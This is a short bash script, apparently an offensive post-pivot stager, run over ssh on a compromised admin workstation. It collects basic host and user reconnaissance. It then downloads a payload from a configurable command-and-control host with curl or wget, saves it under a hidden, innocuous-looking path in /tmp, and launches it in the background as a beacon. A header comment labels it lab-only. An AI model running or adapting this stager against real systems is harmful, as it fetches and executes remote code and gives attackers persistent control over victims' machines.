#!/usr/bin/env bash
# Runs ON admin workstation (stdin via: ssh target 'bash -s' < this_file).
# LAB / authorized scope only — set C2_HOST at runtime; do not commit live C2 URLs.
set -euo pipefail

C2_HOST="${C2_HOST:-http://127.0.0.1:8080}"
STAGE_PATH="${STAGE_PATH:-/tmp/.cache-update}"
PAYLOAD_NAME="${PAYLOAD_NAME:-stage}"
BEACON_PID=""

echo "=== post-pivot staging $(date -Iseconds) ==="
echo "[host] $(hostname) [user] $(whoami) [uid] $(id -u)"
ip -br a 2>/dev/null | head -5 || true

echo "[*] beacon: ${C2_HOST}/${PAYLOAD_NAME} → ${STAGE_PATH}"
if command -v curl >/dev/null 2>&1; then
  curl -fsSL "${C2_HOST}/${PAYLOAD_NAME}" -o "${STAGE_PATH}"
elif command -v wget >/dev/null 2>&1; then
  wget -qO "${STAGE_PATH}" "${C2_HOST}/${PAYLOAD_NAME}"
else
  echo "[-] no curl/wget"
  exit 1
fi

chmod +x "${STAGE_PATH}"
nohup "${STAGE_PATH}" >/dev/null 2>&1 &
BEACON_PID=$!
echo "[+] beacon dispatched pid=${BEACON_PID}"
echo "=== end ==="